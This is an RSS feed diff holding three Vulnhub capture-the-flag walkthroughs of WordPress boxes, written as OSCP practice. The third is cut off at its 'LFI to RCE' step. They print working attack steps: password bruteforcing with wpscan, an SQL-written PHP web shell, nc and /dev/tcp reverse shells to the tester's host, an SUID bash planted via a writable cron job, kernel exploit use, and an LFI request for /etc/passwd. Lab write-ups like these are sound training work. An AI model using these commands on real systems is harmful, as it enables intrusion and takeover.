@@ -1,39 +1,358 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>WordPress on ikuamike</title>
-    <link>https://blog.ikuamike.io/tags/wordpress/</link>
-    <description>Recent content in WordPress on ikuamike</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <copyright>© Michael Ikua</copyright>
-    <lastBuildDate>Tue, 13 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/wordpress/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Vulnhub: Lemon Squeezy 1</title>
-      <link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link>
-      <pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Vulnhub: EVM 1</title>
-      <link>https://blog.ikuamike.io/posts/2021/evm/</link>
-      <pubDate>Fri, 05 Mar 2021 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2021/evm/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Vulnhub: Symfonos 1</title>
-      <link>https://blog.ikuamike.io/posts/2021/symfonos1/</link>
-      <pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2021/symfonos1/</guid>
-      <description></description>
-    </item>
-    
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WordPress on ikuamike</title><link>https://blog.ikuamike.io/tags/wordpress/</link><description>Recent content in WordPress on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Tue, 13 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/wordpress/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Lemon Squeezy 1</title><link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link><pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Beginner&lt;/td>
+&lt;td>26 Apr 2020&lt;/td>
+&lt;td>James Hay&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/lemonsqueezy-1,473/">https://vulnhub.com/entry/lemonsqueezy-1,473/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
+On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
+in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
+as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
+script.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.134
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00014s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.4.25 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+|_http-server-header: Apache/2.4.25 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Apache2 Debian Default Page: It works
+MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&lt;span style="color:#f92672">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
+&lt;p>Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p>
+&lt;p>After performing a directory bruteforce using ffuf we get the following directories:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u &lt;span style="color:#e6db74">&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png" class="center" style="border-radius: 8px;" />
+&lt;p>Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png" class="center" style="border-radius: 8px;" />
+&lt;p>Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png" class="center" style="border-radius: 8px;" />
+&lt;p>Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png" class="center" style="border-radius: 8px;" />
+&lt;p>After logging into wordpress with the discovered credentials &lt;strong>orange:ginger&lt;/strong>, we find another password in drafts.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png" class="center" style="border-radius: 8px;" />
+&lt;p>With this password, we are able to login to phpmyadmin as the orange user.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-6.png" class="center" style="border-radius: 8px;" />
+&lt;p>Successful login:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png" class="center" style="border-radius: 8px;" />
+&lt;p>By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">into&lt;/span> outfile &lt;span style="color:#e6db74">&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can then verify that we have successful command execution, by running the whoami command.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
+&lt;p>Running the below curl command we are able to get a reverse shell:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl &lt;span style="color:#e6db74">&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png" class="center" style="border-radius: 8px;" />
+&lt;p>After performing some manual local enumeration, we discover a cron job running as root.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png" class="center" style="border-radius: 8px;" />
+&lt;p>The script being executed in the cron job is world writeable and the www-data user can write to it.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
+&lt;p>After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /suidbash
+chmod u+s /suidbash
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png" class="center" style="border-radius: 8px;" />
+&lt;p>Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">./suidbash -p
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;ul>
+&lt;li>It seems I forgot user.txt and it is in /var/www.&lt;/li>
+&lt;/ul>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-15.png" class="center" style="border-radius: 8px;" />
+&lt;ul>
+&lt;li>We could write to the wordpress folder from phpmyadmin because it was world-writeable.&lt;/li>
+&lt;/ul>
+&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-16.png" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: EVM 1</title><link>https://blog.ikuamike.io/posts/2021/evm/</link><pubDate>Fri, 05 Mar 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/evm/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/evm/evm.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Beginner&lt;/td>
+&lt;td>2 Nov 2019&lt;/td>
+&lt;td>Ic0de&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/evm-1,391/">https://vulnhub.com/entry/evm-1,391/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
+then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
+was straightforward as we found the root password in a txt file. Some kernel exploits could have also
+been used for privilege escalation.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.103
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00028s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+| ssh-hostkey:
+| &lt;span style="color:#ae81ff">2048&lt;/span> a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+| &lt;span style="color:#ae81ff">256&lt;/span> 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+|_ &lt;span style="color:#ae81ff">256&lt;/span> 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+53/tcp open domain ISC BIND 9.10.3-P4 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux&lt;span style="color:#f92672">)&lt;/span>
+| dns-nsid:
+|_ bind.version: 9.10.3-P4-Ubuntu
+80/tcp open http Apache httpd 2.4.18 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+|_http-server-header: Apache/2.4.18 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+110/tcp open pop3 Dovecot pop3d
+|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
+139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
+143/tcp open imap Dovecot imapd
+|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
+445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
+Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
+|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style="color:#f92672">(&lt;/span>unknown&lt;span style="color:#f92672">)&lt;/span>
+| smb-os-discovery:
+| OS: Windows 6.1 &lt;span style="color:#f92672">(&lt;/span>Samba 4.3.11-Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+| Computer name: ubuntu-extermely-vulnerable-m4ch1ine
+| NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+| Domain name: &lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+| FQDN: ubuntu-extermely-vulnerable-m4ch1ine
+|_ System time: 2021-03-04T15:43:32-05:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2021-03-04T20:43:32
+|_ start_date: N/A
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="samba-139445">Samba (139,445)&lt;/h2>
+&lt;p>Running smbmap and smbclient there&amp;rsquo;s not much there.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -R -H 192.168.56.103
+smbclient -L &lt;span style="color:#ae81ff">\\&lt;/span>192.168.56.103 -N
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From enum4linux-ng we only get a username&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">enum4linux-ng -A -R 192.168.56.103
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h2 id="http-80">HTTP (80)&lt;/h2>
+&lt;p>Visiting the ip on the browser there&amp;rsquo;s only the apache default page.&lt;/p>
+&lt;p>Running directory bruteforce, we discover wordpress.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Wordpress:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Some of the comments hint towards bruteforcing credentials.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Bruteforcing the login page on wordpress we get the password &lt;code>24992499&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t &lt;span style="color:#ae81ff">100&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
+&lt;p>With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span>)&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Loading the following url we get a reverse shell.&lt;/p>
+&lt;pre>&lt;code>http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Changing directory to /home there&amp;rsquo;s one user&amp;rsquo;s folder. Looking at all the files in this directory there&amp;rsquo;s a hidden
+file with the root user&amp;rsquo;s password.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
+&lt;p>Using the password &lt;code>willy26&lt;/code> I switched to the root user.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>Privilege escalation could have also been achieved via kernel exploit.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
+we get several hits.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">searchsploit -m &lt;span style="color:#ae81ff">45010&lt;/span>
+gcc 45010.c -o pwn
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The second one &lt;code>44298&lt;/code> also works.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/evm/evm14.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: Symfonos 1</title><link>https://blog.ikuamike.io/posts/2021/symfonos1/</link><pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Beginner&lt;/td>
+&lt;td>29 June 2019&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-1,322/">https://vulnhub.com/entry/symfonos-1,322/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&amp;rsquo;s OSCP
+Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.&lt;/p>
+&lt;p>In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege
+escalation we exploit a setuid binary that doesn&amp;rsquo;t use absolute paths, therefore hijacking the path gives us root.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>I already have the IP of the box.&lt;/p>
+&lt;p>Nmap output:&lt;/p>
+&lt;pre>&lt;code>Nmap scan report for 192.168.191.128
+Host is up (0.00025s latency).
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+| 2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
+| 256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
+|_ 256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
+25/tcp open smtp Postfix smtpd
+|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
+| ssl-cert: Subject: commonName=symfonos
+| Subject Alternative Name: DNS:symfonos
+| Not valid before: 2019-06-29T00:29:42
+|_Not valid after: 2029-06-26T00:29:42
+|_ssl-date: TLS randomness does not represent time
+80/tcp open http Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+Service Info: Hosts: symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
+|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery:
+| OS: Windows 6.1 (Samba 4.5.16-Debian)
+| Computer name: symfonos
+| NetBIOS computer name: SYMFONOS\x00
+| Domain name: \x00
+| FQDN: symfonos
+|_ System time: 2021-01-21T13:48:08-06:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2021-01-21T19:48:08
+|_ start_date: N/A
+&lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="samba-139445">Samba (139/445)&lt;/h2>
+&lt;p>Using enum4linux-ng we get 2 pieces of useful information.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">enum4linux-ng.py -A 192.168.191.128:
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>A user &lt;strong>helios&lt;/strong> is discovered&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos2.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>and the &lt;strong>anonymous&lt;/strong> share is accessible without credentials.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos3.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Using smbclient to access the share, there is a txt file.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.128&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos4.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Looking at the contents of attention.txt:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos5.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Now we have a username and possible passwords. The combination &lt;strong>helios:qwerty&lt;/strong> works and we can access
+the helios share.&lt;/p>
+&lt;p>We get access to more txt files, but only the todo.txt has valuable information.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos6.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>It gives an endpoint,that we can access on the webserver.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos7.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h2 id="http-80">HTTP (80)&lt;/h2>
+&lt;p>When we access the endpoint we end up on a wordpress instance.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos8.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style="color:#f92672">[&lt;/span>redacted&lt;span style="color:#f92672">]&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
+&lt;li>mail-masta 1.0:&lt;/li>
+&lt;/ol>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos9.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;ol start="2">
+&lt;li>site-editor 1.1.1&lt;/li>
+&lt;/ol>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos10.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Using the PoC available on exploitdb: &lt;a href="https://www.exploit-db.com/exploits/40290/">https://www.exploit-db.com/exploits/40290/&lt;/a> , we can craft this url
+to read files such as /etc/passwd:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style="color:#f92672">=&lt;/span>/etc/passwd
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos11.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h1 id="getting-shell-as-helios---lfi-to-rce">Getting shell as helios - LFI to RCE&lt;/h1>
